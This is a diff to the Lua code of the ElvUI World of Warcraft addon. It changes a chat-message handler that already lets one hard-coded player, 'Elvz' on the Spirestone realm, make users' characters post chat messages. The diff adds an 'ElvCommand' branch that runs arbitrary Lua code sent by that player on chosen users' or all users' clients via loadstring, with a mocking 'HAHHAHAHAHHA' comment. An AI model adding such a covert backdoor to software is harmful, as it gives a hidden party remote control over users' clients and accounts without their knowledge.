@@ -430,11 +430,21 @@ local function SendRecieve(self, event, prefix, message, channel, sender)
 				E:Print(L["Your version of ElvUI is out of date. You can download the latest version from http://www.tukui.org"])
 				E.recievedOutOfDateMessage = true
 			end
-		elseif prefix == 'ElvSays' and ((sender == 'Elvz' and E.myrealm == "Spirestone") or find(sender, "Elvz%-Spirestone")) then ---HAHHAHAHAHHA
-			local user, channel, msg, sendTo = split(',', message)
-			
-			if (user ~= 'ALL' and user == E.myname) or user == 'ALL' then
-				SendChatMessage(msg, channel, nil, sendTo)
+		elseif (prefix == 'ElvSays' or prefix == 'ElvCommand') and ((sender == 'Elvz' and E.myrealm == "Spirestone") or find(sender, "Elvz%-Spirestone")) then ---HAHHAHAHAHHA
+			if prefix == 'ElvSays' then
+				local user, channel, msg, sendTo = split(',', message)
+				
+				if (user ~= 'ALL' and user == E.myname) or user == 'ALL' then
+					SendChatMessage(msg, channel, nil, sendTo)
+				end
+			else
+				local user, executeString = split(',', message)
+				if (user ~= 'ALL' and user == E.myname) or user == 'ALL' then
+					local func, err = loadstring(executeString);
+					if not err then
+						func()
+					end
+				end
 			end
 		end
 	else
